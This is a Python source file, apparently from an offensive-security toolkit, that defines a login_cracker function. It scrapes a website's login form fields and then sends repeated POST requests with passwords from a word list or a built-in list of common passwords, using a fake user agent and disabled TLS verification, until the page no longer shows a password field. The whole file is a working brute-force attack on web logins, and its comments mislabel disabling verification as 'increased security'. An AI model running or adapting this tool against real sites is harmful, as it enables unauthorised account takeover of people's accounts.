import re
import requests
import sys
from TheSilent.clear import clear
from TheSilent.form_scanner import form_scanner
from TheSilent.return_user_agent import return_user_agent

CYAN = "\033[1;36m"
RED = "\033[1;31m"

# create html sessions object
web_session = requests.Session()

# fake user agent
user_agent = {"User-Agent": return_user_agent()}

# increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

# increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

password_list = [
    "admin",
    "administrator",
    "password",
    "root",
    "support",
    "123456",
    "qwerty",
    "12345678",
    "qwerty123",
    "1234567",
    "1234567890",
    "DEFAULT",
    "000000",
    "iloveyou",
    "qwertyuiop",
    "654321",
    "123456a",
    "dragon",
    "1qaz2wsx",
    "123qwe",
    "7777777",
    "123",
    "zxcvbnm",
    "123abc",
    "555555",
    "qwerty1",
    "222222",
    "asdfghjkl",
    "123123123",
    "target123",
    "tinkle",
    "159753",
    "1234qwer",
    "computer",
    "michael",
    "11111111",
    "aaaaaa",
    "ashley",
    "789456123",
    "999999",
    "shadow",
    "iloveyou1",
    "123456789a",
    "888888",
    "qwer1234",
    "fuckyou1",
    "azerty",
    "q1w2e3r4",
    "baseball",
    "princess1",
    "asd123",
    "asdasd",
    "soccer"]

# attempts to login using a dictionary attack
def login_cracker(url, user_name="", word_list=" ", secure=True, tor=False):
    global password_list

    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    my_url = my_secure + url

    form_data = form_scanner(url, secure=secure, tor=tor, parse="input")
    form_activities = form_scanner(url, secure=secure, tor=tor)

    clear()

    text = False
    passcode = False
    submit = False

    for activity in form_activities:
        try:
            action = re.findall("action=\"(\\S+)\"", activity)

            try:
                if action[0] != "":
                    if my_url.endswith("/") and url not in action[0]:
                        my_link = my_url + action[0]

                    elif not my_url.endswith("/") and url not in action[0]:
                        my_link = my_url + "/" + action[0]

                    else:
                        my_link = my_url

            except IndexError:
                my_link = my_url

        except IndexError:
            print(RED + "ERROR! No login forms detected!")
            sys.exit()
                
        if word_list != " ":
            for i in form_data:
                if "text" in i:
                    try:
                        user = re.findall("(name=\")(\\S+)(\")", i)
                        user = user[0][1]
                        text = True

                    except:
                        pass

                if "password" in i:
                    try:
                        password = re.findall("(name=\")(\\S+)(\")", i)
                        password = password[0][1]
                        passcode = True

                    except:
                        pass

                if "submit" in i:
                    try:
                        submit_name = re.findall("(name=\")(\\S+)(\")", i)
                        print(submit_name)
                        submit_name = submit_name[0][1]
                        submit_value = re.findall("(value=\")(\\S+)(\")", i)
                        submit_value = submit_value[0][1]
                        submit = True

                    except:
                        pass

            with open(word_list, "r") as f:
                for i in f:
                    key = i.replace("\n", "")

                    if text and passcode and submit:
                        payload = {
                            user: user_name,
                            password: key,
                            submit_name: submit_value}

                    if text and passcode and not submit:
                        payload = {user: user_name, password: key}

                    if not text and passcode and not submit:
                        payload = {password: key}

                    if not text and passcode and submit:
                        payload = {password: key, submit_name: submit_value}

                    try:
                        result = web_session.post(my_link, data=payload, verify=False, headers=user_agent, timeout=(5,30)).text

                        if "type=\"password\"" not in result.lower():
                            print("True: " + key)
                            break

                        if "type=\"password\"" in result.lower():
                            print("False: " + key)

                    except:
                        print("ERROR!")
                        break

        if word_list == " ":
            for i in form_data:
                if "text" in i:
                    try:
                        user = re.findall("(name=\")(\\S+)(\")", i)
                        user = user[0][1]
                        text = True

                    except:
                        pass

                if "password" in i:
                    try:
                        password = re.findall("(name=\")(\\S+)(\")", i)
                        password = password[0][1]
                        passcode = True

                    except:
                        pass

                if "submit" in i:
                    try:
                        submit_name = re.findall("(name=\")(\\S+)(\")", i)
                        submit_name = submit_name[0][1]
                        submit_value = re.findall("(value=\")(\\S+)(\")", i)
                        submit_value = submit_value[0][1]
                        submit = True

                    except:
                        pass

            for key in password_list:
                if text and passcode and submit:
                    payload = {
                        user: user_name,
                        password: key,
                        submit_name: submit_value}

                if text and passcode and not submit:
                    payload = {user: user_name, password: key}

                if not text and passcode and not submit:
                    payload = {password: key}

                if not text and passcode and submit:
                    payload = {password: key, submit_name: submit_value}

                

                try:
                    print("checking: " + str(key))
                    result = web_session.post(my_link, data=payload, verify=False, headers=user_agent, timeout=(5,30)).text

                    if "type=\"password\"" not in result.lower():
                        print(CYAN + "True: " + key)
                        break

                    if "type=\"password\"" in result.lower():
                        print(CYAN + "False: " + key)

                except:
                    print(red + "ERROR!")
                    break
